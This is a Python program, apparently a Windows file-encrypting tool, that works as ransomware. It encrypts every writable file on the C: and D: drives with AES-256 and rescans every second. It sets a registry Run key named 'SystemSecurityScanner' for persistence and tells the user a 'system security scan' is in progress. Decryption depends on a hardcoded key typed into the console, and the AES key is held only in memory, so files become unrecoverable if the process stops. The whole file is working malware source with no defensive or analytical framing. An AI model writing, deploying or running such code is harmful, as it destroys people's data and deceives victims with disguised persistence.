import os
import sys
import time
import ctypes
import winreg
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# ===== CONFIGURATION =====
DEATH_SWITCH_KEY = "123"  # CHANGE THIS
MONITOR_INTERVAL = 1  # Seconds between scans
EXCLUSIONS = {  # Folders to skip
    'Windows'
}

# ===== ENCRYPTION ENGINE =====
class SystemEncryptor:
    def __init__(self):
        self.key = get_random_bytes(32)  # AES-256
        self.encrypted_files = set()
        self.running = True

    def encrypt_file(self, path):
        try:
            if path in self.encrypted_files or not os.access(path, os.W_OK):
                return False

            with open(path, 'rb') as f:
                data = f.read()

            cipher = AES.new(self.key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data, AES.block_size))

            with open(path, 'wb') as f:
                f.write(cipher.iv + ct_bytes)

            self.encrypted_files.add(path)
            return True
        except Exception as e:
            return False

    def decrypt_file(self, path):
        try:
            with open(path, 'rb') as f:
                encrypted_data = f.read()

            iv = encrypted_data[:16]
            ct = encrypted_data[16:]
            cipher = AES.new(self.key, AES.MODE_CBC, iv=iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)

            with open(path, 'wb') as f:
                f.write(pt)

            return True
        except Exception:
            return False

# ===== SYSTEM INTEGRATION =====
def install_persistence():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "SystemSecurityScanner", 0, winreg.REG_SZ, sys.executable)
    except Exception:
        pass

def scan_drive(encryptor, root='C:\\'):
    for dirpath, dirnames, filenames in os.walk(root):
        # Skip excluded directories
        dirnames[:] = [d for d in dirnames if d not in EXCLUSIONS]
        
        for filename in filenames:
            filepath = os.path.join(dirpath, filename)
            encryptor.encrypt_file(filepath)

# ===== MONITORING =====
def monitor_changes(encryptor):
    while encryptor.running:
        for drive in ['C:\\', 'D:\\'] if os.path.exists('D:\\') else ['C:\\']:
            scan_drive(encryptor, drive)
        time.sleep(MONITOR_INTERVAL)

# ===== SAFETY CONTROLS =====
def death_switch(encryptor):
    print("\n[!] Enter recovery key to decrypt system:")
    attempt = input("> ").strip()
    
    if attempt == DEATH_SWITCH_KEY:
        encryptor.running = False
        print("[+] Decrypting files...")
        
        for filepath in list(encryptor.encrypted_files):
            if os.path.exists(filepath):
                encryptor.decrypt_file(filepath)
        
        print("[+] System restored. Removing persistence...")
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.DeleteValue(regkey, "SystemSecurityScanner")
        except Exception:
            pass
        
        sys.exit(0)
    else:
        print("[!] Invalid key - encryption remains active")

# ===== MAIN =====
if __name__ == "__main__":
    if not getattr(sys, 'frozen', False):
        print("This executable must be compiled first")
        sys.exit(1)

    encryptor = SystemEncryptor()
    install_persistence()

    # Initial encryption thread
    threading.Thread(target=scan_drive, args=(encryptor,), daemon=True).start()
    
    # Monitoring thread
    threading.Thread(target=monitor_changes, args=(encryptor,), daemon=True).start()

    # Safety controls
    print("[!] System security scan in progress...")
    print(f"[!] Enter '{DEATH_SWITCH_KEY}' to terminate and restore")
    
    while True:
        death_switch(encryptor)
        time.sleep(5)